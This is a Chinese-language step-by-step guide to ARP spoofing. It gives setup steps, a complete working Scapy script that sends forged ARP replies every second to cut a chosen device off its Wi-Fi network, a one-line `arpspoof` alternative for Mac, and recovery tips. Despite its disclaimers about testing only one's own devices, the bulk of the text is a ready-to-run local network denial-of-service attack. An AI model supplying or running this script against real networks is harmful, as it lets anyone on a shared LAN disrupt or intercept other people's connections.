# ARP 欺骗攻击 — 完整操作指南

## 前提条件

- 攻击者电脑和目标设备在**同一个 WiFi / 局域网**内
- 只攻击自己的设备，不要攻击他人设备
- Windows 系统需要安装 **Python 3** 和 **Npcap**

## 第一步：安装依赖

### 安装 Npcap（Windows 底层抓包驱动）

从 [https://npcap.com/dist/](https://npcap.com/dist/) 下载最新版，运行安装程序，全部默认设置，点 Install。

### 安装 Scapy（Python 网络包构造库）

```
pip install scapy
```

## 第二步：获取网络信息

### 查看电脑 IP 和网关

```powershell
# Windows
ipconfig
```

找到 Wi-Fi 适配器的：

- **IPv4 Address**：你电脑的 IP（如 192.168.2.14）
- **Default Gateway**：路由器的 IP（如 192.168.2.1）

### 查看目标设备 IP

- iPhone：设置 → Wi-Fi → 点击已连接网络旁的 (i) → IP 地址
- Android：设置 → WLAN → 点击已连接网络 → IP 地址

### 验证连通性

```powershell
ping 目标IP
```

能收到回复说明可以通信。

## 第三步：创建攻击脚本

创建文件 `arp_spoof.py`，内容如下（修改前三行的 IP 地址）：

```python
from scapy.all import ARP, Ether, sendp, getmacbyip
import time
import sys

TARGET_IP = "192.168.2.60"     # 目标设备 IP（改成你的）
GATEWAY_IP = "192.168.2.1"    # 路由器 IP（改成你的）

print("[*] ARP Spoof Script")
print(f"[*] Target: {TARGET_IP}")
print(f"[*] Gateway: {GATEWAY_IP}")

print("[*] Resolving MAC addresses...")
target_mac = getmacbyip(TARGET_IP)
gateway_mac = getmacbyip(GATEWAY_IP)

if not target_mac:
    print("[!] Could not resolve target MAC. Is the device connected?")
    sys.exit(1)
if not gateway_mac:
    print("[!] Could not resolve gateway MAC.")
    sys.exit(1)

print(f"[*] Target MAC:  {target_mac}")
print(f"[*] Router MAC:  {gateway_mac}")
print("[*] Starting ARP spoofing... Press Ctrl+C to stop.\n")

poison_pkt = Ether(dst=target_mac) / ARP(
    op="is-at",
    psrc=GATEWAY_IP,
    pdst=TARGET_IP,
    hwdst=target_mac
)

try:
    count = 0
    while True:
        sendp(poison_pkt, verbose=False)
        count += 1
        print(f"\r[*] Sent {count} spoofed ARP packets...", end="", flush=True)
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n[*] Stopping attack. Restoring ARP table...")
    restore_pkt = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=GATEWAY_IP,
        hwsrc=gateway_mac,
        pdst=TARGET_IP,
        hwdst=target_mac
    )
    for _ in range(5):
        sendp(restore_pkt, verbose=False)
        time.sleep(0.5)
    print("[*] ARP table restored. Device should be back online.")
```

## 第四步：运行攻击

```powershell
python arp_spoof.py
```

运行后目标设备会断网。按 **Ctrl+C** 停止攻击并自动恢复目标设备的网络。

## 原理说明

```
正常情况：
  目标设备的 ARP 表：路由器 IP → 路由器真实 MAC
  目标上网流量 → 路由器 → 互联网 ✅

攻击后：
  脚本每秒发假 ARP 包："路由器 IP 的 MAC 是我（攻击者）的 MAC"
  目标设备的 ARP 表被篡改：路由器 IP → 攻击者 MAC
  目标上网流量 → 攻击者电脑（不转发）→ 断网 ❌

停止后：
  脚本发修复 ARP 包："路由器 IP 的 MAC 是路由器真实 MAC"
  ARP 表恢复 → 目标恢复上网 ✅
```

## Mac 上使用

Mac 不需要 Npcap，原生支持。只需：

```bash
pip3 install scapy
sudo python3 arp_spoof.py
```

或者用一行命令（需要安装 dsniff）：

```bash
brew install dsniff
sudo arpspoof -i en0 -t 目标IP 网关IP
```

## 恢复问题

停止攻击后目标设备可能仍然无法上网，即使发了修复包。这是因为 ARP 欺骗会级联影响设备的整个网络栈（路由表、TCP 连接池、DHCP 租约等），不只是 ARP 缓存。

修复方法（按有效程度排序）：
1. 发修复 ARP 包（脚本 Ctrl+C 自动发）— 大部分情况有效
2. 目标设备关闭再打开 WiFi — 可能有效
3. 目标设备"忘记此网络"然后重新连接 WiFi — 几乎必定有效（彻底重置所有网络缓存）

## 注意事项

- 只在自己的局域网内对自己的设备测试
- 对他人设备使用属于违法行为
- ARP 欺骗只能在同一局域网/子网内生效，无法跨路由器/跨互联网

